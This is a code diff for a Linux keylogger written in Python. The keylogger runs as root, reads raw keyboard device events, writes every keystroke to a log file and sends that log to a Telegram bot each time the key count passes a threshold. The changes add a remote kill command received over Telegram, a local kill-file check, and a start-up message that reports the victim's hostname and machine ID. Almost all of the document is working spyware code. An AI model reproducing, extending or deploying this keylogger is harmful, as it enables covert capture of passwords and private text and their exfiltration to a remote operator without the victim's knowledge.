@@ -6,17 +6,26 @@ import struct
 import sys
 import time
 import threading
-from send import send
+
+from telegramUtils import initChatID
+from telegramUtils import sendFromFile
+from telegramUtils import getLastMsg
+from telegramUtils import syncWithLatestUpdate
 
 wantSHIFT = 0       #do you want in the logs [SHIFT] when target press shift    (1/0)
-debugging = 0       #get extra comments                                         (1/0)
-threshold = 10      #how many keys after sending the text to the telegram bot   (int)
+debugging = 1       #get extra comments                                         (1/0)
+deletFile = 1       #do you want to delete the file at the start                (1/0)
+enableLocalKillSwitch = 1                                                     # (1/0)
+threshold = 10      #how many keys after sendFromFileing the text to the telegram bot   (int)
 
 LOG_FILE = 'keys.log'
 hostname = socket.gethostname()
 machine_id = uuid.getnode()
 EVENT_FORMAT = 'llHHI'
 EVENT_SIZE   = struct.calcsize(EVENT_FORMAT)
+
+kill_flag = threading.Event()
+
 
 KEYMAP = {
     1: "<ESC>", 2: '1', 3: '2', 4: '3', 5: '4', 6: '5',
@@ -58,7 +67,6 @@ USA_SHIFT_MAP = {
     'n': 'N', 'm': 'M', ' ': ' ',
 }
 
-
 # UTILS:
 
 def FindKeyboardPath():
@@ -77,30 +85,29 @@ def decode_event(data):
     return struct.unpack(EVENT_FORMAT, data)
 
 def code2char(code):
-    """Mappa un keycode a un carattere leggibile."""
     return KEYMAP.get(code, f"<{code}>")
 
-def save_o_file(c):
-    """Appende il carattere al log file."""
+def WriteOnFile(c):
     with open(LOG_FILE, 'a') as f:
         f.write(c)
+
+def checkLocalKillSwitch():
+    return 1 if os.path.isfile("/tmp/kill") else 0
+
+def saveKey(key):
+    global contKeys
+    log_buffer.append(key)
+    WriteOnFile(key)
+    contKeys = contKeys + 1
+
+    if contKeys > threshold:
+        sendFromFile(LOG_FILE)
+        contKeys = 0
 
 flagSHIFT = 0
 shift_lock = threading.Lock()
 log_buffer = []
 contKeys = 0
-
-# SAVE KEYS
-
-def saveKey(key):
-    global contKeys
-    log_buffer.append(key)
-    save_o_file(key)
-    contKeys = contKeys + 1
-
-    if contKeys > threshold:
-        send(LOG_FILE)
-        contKeys = 0
 
 # THREAD SHIFT
 
@@ -120,11 +127,11 @@ def monitorShift(fd_shift):
                     if value == 1 or value == 2:
                         flagSHIFT = 1
                         if debugging and value==1:
-                            print("[--] Shift PRESSED")
+                            print("[**] Shift PRESSED")
                     elif value == 0:
                         flagSHIFT = 0
                         if debugging:
-                            print("[--] Shift REALESED")
+                            print("[**] Shift REALESED")
 
         except BlockingIOError:
             time.sleep(0.005)
@@ -136,7 +143,15 @@ def monitorShift(fd_shift):
 def monitorKeys(fd):
     if debugging:
         print("[+] monitorKeys Thread correcly working")
+
     while True:
+        #KillSwitch conditions calls
+        if kill_flag.is_set() or (checkLocalKillSwitch() and enableLocalKillSwitch):
+            if debugging:
+                print("[-] kill switch matched, esco da monitorKeys")
+            break
+
+        #getting an event
         try:
             data = os.read(fd, EVENT_SIZE)
         except BlockingIOError:
@@ -146,6 +161,7 @@ def monitorKeys(fd):
             continue
         sec, usec, ev_type, code, value = decode_event(data)
 
+        #reading the keyboard event
         if ev_type == 1:
             if value == 1:
                 c = code2char(code)
@@ -155,25 +171,36 @@ def monitorKeys(fd):
                             c = SHIFT_MAP.get(c, c)
                     if c:
                         if debugging:
-                            print(f"[-] Registerd: {c}")
+                            print(f"[*] Registerd: {c}")
                         saveKey(c)
-                    if code == 1:
-                        if debugging:
-                            print("\n[!] ESC, exit.")
-                        break
 
             if value == 0 and code2char(code)=="[SHIFT]" and wantSHIFT:
                 log_buffer.append("[SHIFTUP]")
-                save_o_file("[SHIFT]UP")
+                WriteOnFile("[SHIFT]UP")
+
+# THREAD KILL SWITCH
+
+def chechRemoteKillSwitch():
+    while not kill_flag.is_set():
+        text = getLastMsg()
+        if text == f"/kill {machine_id}":
+            if debugging:
+                print("command /kill got")
+            kill_flag.set()
+            return
+        time.sleep(1)  # evita busy‑loop
 
 # MAIN
 
 def main():
+
+    #check for root
     if os.geteuid() != 0:
         if debugging:
             print("[!]Error: need sudo/root priviledges!", file=sys.stderr)
         sys.exit(1)
 
+    #looking for a keyboard
     try:
         kbd_path = FindKeyboardPath()
     except RuntimeError as e:
@@ -183,12 +210,15 @@ def main():
 
     if debugging:
         print(f"[+] saving keys on {LOG_FILE}")
-        
+    
     fd1 = OpenDevice(kbd_path)
     fd2 = OpenDevice(kbd_path)
 
+    # starting threads
     t_shift = threading.Thread(target=monitorShift, args=(fd1,), daemon=True)
+    t_kill = threading.Thread(target=chechRemoteKillSwitch, daemon=True)
     t_shift.start()
+    t_kill.start()
 
     if debugging:
         print(f"[+] listening on {kbd_path}... (press ESC to exit)")
@@ -198,6 +228,7 @@ def main():
         os.close(fd1)
         os.close(fd2)
 
+    #closing
     testo = ''.join(log_buffer)
     if debugging:
         print(f"registerd about ({len(log_buffer)}) keys:")
@@ -205,6 +236,21 @@ def main():
 
 
 if __name__ == '__main__':
-    save_o_file("hostname: " + str(hostname))
-    save_o_file(", machine_id: " + str(machine_id) + "\n")
+
+    # delete LOG_FILE at the start
+    if os.path.isfile(LOG_FILE) and deletFile:  
+        try:
+            os.remove(LOG_FILE)
+        except OSError as e:
+            print(f"Error deleting log file '{LOG_FILE}': {e}")
+
+    #start telegram bot
+    initChatID()
+    syncWithLatestUpdate()
+
+    # starting messages
+    WriteOnFile("CONNECTED\nhostname: " + str(hostname) + ",\nmachine_id: " + str(machine_id))
+    sendFromFile(LOG_FILE)
+    WriteOnFile("\nTEXT:\n")
+
     main()
